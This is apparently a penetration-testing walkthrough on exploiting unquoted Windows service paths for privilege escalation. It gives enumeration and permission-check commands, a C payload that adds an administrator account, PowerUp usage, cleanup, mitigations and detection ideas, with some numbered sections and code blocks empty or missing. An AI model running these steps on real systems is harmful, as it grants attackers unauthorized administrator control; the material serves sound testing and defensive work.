## Overview

Windows services execute a configured binary when they start.

If a service path:

```text
contains spaces
and
is not enclosed in quotation marks
```

Windows may interpret the path ambiguously and attempt to execute multiple possible filenames from left to right.

If a low-privileged user can write to one of the intermediate directories, they may be able to place a malicious executable there. When the service starts, Windows may execute the attacker-controlled binary with the service account’s privileges.

The general methodology is:

```text
Enumerate service paths
↓
Find paths containing spaces without quotes
↓
Identify how Windows parses the path
↓
Check each intermediate directory for write access
↓
Confirm service account and restart capability
↓
Place payload using the interpreted filename
↓
Start or restart the service
↓
Validate elevated execution
↓
Remove payload and restore service behavior
```

> [!important]
> An unquoted path is only exploitable when the current user can write to a relevant intermediate location and the service executes with higher privileges.

---

# Why Unquoted Service Paths Matter

Consider this service path:

```text
C:\Program Files\My Program\My Service\service.exe
```

Because the path contains spaces and is not quoted, Windows may try:

```text
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My Service\service.exe
```

An attacker does not need to overwrite the legitimate service binary.

Instead, they may be able to create one of the earlier executable candidates:

```text
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
```

If that file exists and Windows selects it first, it executes with the service’s privileges.

---

# Exploitation Requirements

A useful unquoted service path normally requires:

```text
service path contains one or more spaces
service path is not enclosed in quotes
service runs as a more privileged account
one intermediate directory is writable
attacker can place the correctly named executable
service can be restarted or will start automatically
```

High-value service accounts include:

```text
LocalSystem
NT AUTHORITY\SYSTEM
LocalService
NetworkService
privileged local or domain accounts
```

# 1. Enumerate Services

## PowerShell

```powershell
Get-CimInstance -ClassName Win32_Service |
Select-Object Name, State, StartName, StartMode, PathName
```

Filter to non-Windows paths:

```powershell
Get-CimInstance -ClassName Win32_Service |
Where-Object {
    $_.PathName -and
    $_.PathName -notmatch '^"?C:\\Windows\\'
} |
Select-Object Name, State, StartName, StartMode, PathName
```

---

## WMIC

Run from `cmd.exe` to avoid quote-escaping issues:

```cmd
wmic service get name,pathname
```

Filter out Windows paths and quoted paths:

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

This highlights service paths that:

```text
are outside C:\Windows
and
do not contain quotation marks
```

> [!note]
> This command identifies candidates, not confirmed vulnerabilities.

---

## sc.exe

Inspect a specific service:

```cmd
sc qc <service_name>
```

Look for:

```text
BINARY_PATH_NAME
SERVICE_START_NAME
START_TYPE
```

Example:

```cmd
sc qc GammaService
```

# 2. Identify Candidate Paths

High-value example:

```text
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Reasons it is interesting:

```text
contains spaces
is not quoted
is outside C:\Windows
belongs to a third-party or custom application
```

---

# 3. Work Out the Interpreted Executable Paths

For:

```text
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Windows may try:

```text
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

The candidate payload names are therefore:

| Writable Location | Payload Name |
|---|---|
| `C:\` | `Program.exe` |
| `C:\Program Files\` | `Enterprise.exe` |
| `C:\Program Files\Enterprise Apps\` | `Current.exe` |

> [!tip]
> Work from left to right and stop at the first writable location that maps to a valid interpreted executable name.

---

# 4. Check Service Execution Account

PowerShell:

```powershell
Get-CimInstance Win32_Service |
Where-Object {$_.Name -eq "<service_name>"} |
Select-Object Name, StartName, PathName
```

Using `sc`:

```cmd
sc qc <service_name>
```

High-value result:

```text
SERVICE_START_NAME : LocalSystem
```

If the service runs as a normal user, the hijack may still give code execution but may not escalate privileges.

# 6. Check Intermediate Directory Permissions

Use `icacls` on each candidate directory.

## Root of C:

```cmd
icacls "C:\"
```

## Program Files

```cmd
icacls "C:\Program Files"
```

## Third-Party Application Directory

```cmd
icacls "C:\Program Files\Enterprise Apps"
```

Common permission masks:

| Mask | Meaning |
|---|---|
| `F` | Full control |
| `M` | Modify |
| `W` | Write |
| `RX` | Read and execute |
| `R` | Read |

High-risk examples:

```text
BUILTIN\Users:(W)
BUILTIN\Users:(M)
BUILTIN\Users:(F)
Authenticated Users:(W)
Authenticated Users:(M)
Everyone:(W)
```

Example vulnerable permission:

```text
BUILTIN\Users:(OI)(CI)(RX,W)
```

This indicates members of `Users` can write to the directory.

---

# 7. Confirm Current Group Membership

```cmd
whoami /groups
```

Check whether the current user belongs to the group with write permissions.

Common low-privileged principals:

```text
BUILTIN\Users
Authenticated Users
Everyone
```

# 8. Choose the Correct Payload Filename

The payload filename must match the executable Windows is expected to try at the writable path.

Example service path:

```text
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Writable directory:

```text
C:\Program Files\Enterprise Apps
```

Required payload name:

```text
Current.exe
```

Final placement:

```text
C:\Program Files\Enterprise Apps\Current.exe
```

# 9. Create a Payload

Use a simple, controlled payload first.

## Example C Payload – Create Local Administrator

```c
#include <stdlib.h>

int main()
{
    system("net user svcadmin Password123! /add");
    system("net localgroup administrators svcadmin /add");

    return 0;
}
```

Save as:

```text
adduser.c
```

> [!warning]
> Creating accounts is intrusive. Use only in labs or where explicitly authorised, and remove the account afterward.



# 12. Trigger the Service

## Start the Service

```powershell
Start-Service GammaService
```

or:

```cmd
net start GammaService
```

The service may display an error such as:

```text
The service could not be started
```

This does not necessarily mean the payload failed.

A normal executable may not behave like a valid Windows service binary, so the Service Control Manager can report failure even though the payload executed.

> [!important]
> Always validate the payload’s side effect rather than relying only on the service start result.

```powershell

```

Useful fields:

| Field | Meaning |
|---|---|
| `ServiceName` | Candidate service |
| `Path` | Unquoted service path |
| `ModifiablePath` | Writable intermediate location |
| `StartName` | Service account |

```text

```

# 16. PowerUp Exploitation

PowerUp may recommend:

```powershell
Write-ServiceBinary -Name '<service_name>' -Path '<hijack_path>'
```

Example:

```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

Trigger:

```powershell
Restart-Service GammaService
```

The service may fail to start but the payload may still execute.

Validate:

```cmd
net user
```

```cmd
net localgroup administrators
```

> [!important]
> Review automated tool behavior before running it. PowerUp may create a default administrative user depending on the version and function used.

# Decision Tree

## Does the Service Path Contain Spaces?

```text
No
→ Not an unquoted service path issue

Yes
→ Check whether the path is quoted
```

---

## Is the Path Quoted?

Safe example:

```text
"C:\Program Files\Vendor App\service.exe"
```

Potentially vulnerable example:

```text
C:\Program Files\Vendor App\service.exe
```

---

## Is an Intermediate Directory Writable?

```text
No
→ Candidate is not exploitable from current context

Yes
→ Determine exact payload filename
```

---

## Does the Service Run Privileged?

```text
No
→ Code execution may not escalate

Yes
→ Continue
```

---

## Can You Restart the Service?

```text
Yes
→ Trigger immediately

No
→ Check automatic startup, reboot rights, or scheduled restart
```

---

## Service Start Reports an Error

Check the payload side effect.

The executable may have run before the Service Control Manager determined that it was not a valid service binary.

# Troubleshooting

## WMIC Is Missing

Use PowerShell:

```powershell
Get-CimInstance Win32_Service |
Where-Object {
    $_.PathName -match ' ' -and
    $_.PathName -notmatch '^".*"$'
} |
Select Name,StartName,State,StartMode,PathName
```

---

## Path Contains Arguments

Example:

```text
C:\Program Files\Vendor App\service.exe -config C:\config.ini
```

Focus on the executable portion and derive candidates based on spaces before the actual executable ends.

Use:

```cmd
sc qc <service_name>
```

to inspect the exact configured path.

---

## Cannot Write the Payload

Check:

```text
directory ACL
effective group membership
antivirus
application self-protection
file already exists
```

Use:

```cmd
icacls "<candidate_directory>"
```

Test:

```powershell
"test" | Out-File "<candidate_directory>\test.txt"
```

---

## Service Cannot Be Restarted

Check:

```text
service ACLs
automatic startup
SeShutdownPrivilege
failure actions
scheduled tasks
expected admin activity
```

---

## Payload Executes but Service Breaks

This is common when the payload is not a valid service executable.

The payload may still have executed successfully.

Remove it and restore normal service resolution.

---

## PowerUp Flags the Service but Exploitation Fails

Manually verify:

```text
actual writable path
correct interpreted executable name
service account
restart capability
```

Automated tools can identify candidates incorrectly or choose a non-ideal hijack path.

# Cleanup

Remove the planted executable:

```cmd
del "C:\Program Files\Enterprise Apps\Current.exe"
```

Remove temporary administrative user:

```cmd
net user svcadmin /delete
```

If PowerUp created another user:

```cmd
net user john /delete
```

Restart the service:

```powershell
Start-Service GammaService
```

Remove tools:


# Defensive Notes

## Root Cause

Unquoted service path vulnerabilities occur when:

```text
a service executable path contains spaces
and
the path is not quoted
and
an intermediate directory is writable
```

Windows may execute an unintended binary before reaching the legitimate service executable.

---

# Mitigations

Administrators should:

```text
quote all service executable paths
restrict write access to application directories
review third-party service installations
run services with least privilege
audit service configuration regularly
remove broad Users or Authenticated Users write permissions
use application control such as WDAC or AppLocker
```

Secure configuration:

```text
"C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe"
```

---

# Fix the Service Path

Using `sc.exe`:

```cmd
sc config <service_name> binPath= "\"C:\Program Files\Vendor App\service.exe\""
```

> [!note]
> `sc.exe` requires a space after `binPath=`.

Verify:

```cmd
sc qc <service_name>
```

---

# Detection Ideas

Monitor for:

```text
new executables written into Program Files subdirectories
Program.exe created in C:\
unexpected binaries with names matching path fragments
service start failures followed by local account creation
changes to service ImagePath registry values
PowerUp execution
net user and net localgroup commands spawned by service processes
```

Suspicious sequence:

```text
service path enumeration
↓
icacls on intermediate directories
↓
payload written as path-fragment executable
↓
service restart
↓
new administrator account or unexpected process execution
```

---

# Key Takeaways

- Unquoted service paths rely on ambiguity caused by spaces in an unquoted executable path.
- Windows may try multiple executable names from left to right.
- The vulnerability requires a writable intermediate directory.
- The payload filename must exactly match the interpreted path fragment.
- The service must run with higher privileges for escalation to occur.
- Direct restart rights make exploitation easier but are not always required.
- A service start error does not prove the payload failed.
- PowerUp can identify and exploit candidates, but manual validation is essential.
- Always remove the planted executable and restore normal service behavior.
